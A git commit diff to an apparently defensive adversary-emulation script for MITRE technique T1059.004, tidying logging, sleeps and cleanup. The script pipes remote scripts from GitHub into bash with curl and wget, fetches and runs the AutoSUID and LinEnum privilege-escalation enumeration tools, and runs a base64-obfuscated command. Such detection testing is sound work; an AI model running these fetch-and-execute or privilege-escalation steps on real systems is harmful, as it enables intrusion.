fbe03a4b83115dfdafc8b6e065a81f0952636092
blueteamdefendersco <145217566+blueteamdefendersco@users.noreply.github.com>
2023-11-29 03:07:17 -0600

    Update T1059.004.sh

--- atomic_scripts/linux/execution/T1059.004.sh
+++ atomic_scripts/linux/execution/T1059.004.sh
@@ -1,69 +1,70 @@
-#! /bin/bash
+#!/bin/bash
 
 # T1059.004 - Command and Scripting Interpreter: Bash
 
 function a() {
 # Atomic Test 1 - Create and Execute Bash Shell Script
-    echo  $(date -u) "Start of T1059.004 - Create and Execute Bash Shell Script" >> /tmp/attacktest.txt
     sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
     sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
     chmod +x /tmp/art.sh
     sh /tmp/art.sh
     echo  $(date -u) "Completed T1059.004 - Create and Execute Bash Shell Script" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
+    rm /tmp/art.sh
 }
 
 function b() {
 # Atomic Test #2 - Command-Line Interface
 # Using Curl to download and pipe a payload to Bash
-    echo "==============================="
-    echo $(date -u) "Start of T1059.004 - Command-Line Interface" >> /tmp/attacktest.txt
     curl -sS https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/echo1.sh | bash
     wget --quiet -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/echo2.sh | bash
     echo  $(date -u) "Completed T1059.004 - Command-Line Interface" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
+    rm /tmp/T1059.004-test2.txt
+    rm /tmp/T1059.004-test2-2.txt
 }
 
 function c() {
 # Atomic Test 3 - Harvest SUID executable files
 # AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
-    echo $(date -u) "Start of T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
-    wget -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh | bash >> /tmp/attackresults.txt
+    wget -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh | bash >> /tmp/T1059-004_autosuid1.txt
     echo  $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt    
-    sleep 60
+    sleep 5
+    rm /tmp/T1059-004_autosuid1.txt
 }
 
 function d() {
 # Atomic Test 3 - Harvest SUID executable files
 # AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
-    echo $(date -u) "Start of T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
     wget https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh
     chmod +x autosuid.sh
     bash autosuid.sh
     echo $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
+    rm autosuid.sh
 }
 
 function e() {
 # Atomic Test 4 - LinEnum tool execution
 # LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.
-    echo $(date -u) "Start of T1059.004 - LinEnum tool execution" >> /tmp/attacktest.txt
     wget https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/linenum.sh
     chmod +x linenum.sh
     bash linenum.sh
     echo $(date -u) "Completed T1059.004 - LinEnum tool execution" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
+    rm linenum.sh
 }
 
 function f() {
 # Atomic Test 5 - New script file in the tmp directory
 # An attacker may create script files in the /tmp directory using the mktemp utility and execute them.
-    echo $(date -u) "Start of T1059.004 - New script file in the tmp directory" >> /tmp/attacktest.txt
     TMPFILE=$(mktemp)
     echo "id" > $TMPFILE
     bash $TMPFILE
     echo $(date -u) "Completed T1059.004 - New script file in the tmp directory" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
+    rm $TMPFILE
+    unset TMPFILE
 }
 
 function g() {
@@ -72,7 +73,7 @@ function g() {
     echo $(date -u) "Start of T1059.004 - Command line scripts" >> /tmp/attacktest.txt
     for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done >> /tmp/attackresults.txt
     echo $(date -u) "Completed T1059.004 - Command line scripts" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
 }
 
 function h() {
@@ -84,15 +85,10 @@ function h() {
     echo -n "$ART" |base64 -d |/bin/bash >> /tmp/attackresults.txt
     unset ART
     echo $(date -u) "Completed T1059.004 - Obfuscated command line scripts" >> /tmp/attacktest.txt
-    sleep 60
+    sleep 5
 }
 
 function z() {
-    rm /tmp/art.sh
-    rm autosuid.sh
-    rm linenum.sh
-    rm $TMPFILE
-    unset TMPFILE
     echo $(date -u) "Cleaned up T1059.004" >> /tmp/attacktest.txt
 }
 
@@ -108,4 +104,3 @@ f
 g
 h
 z
-
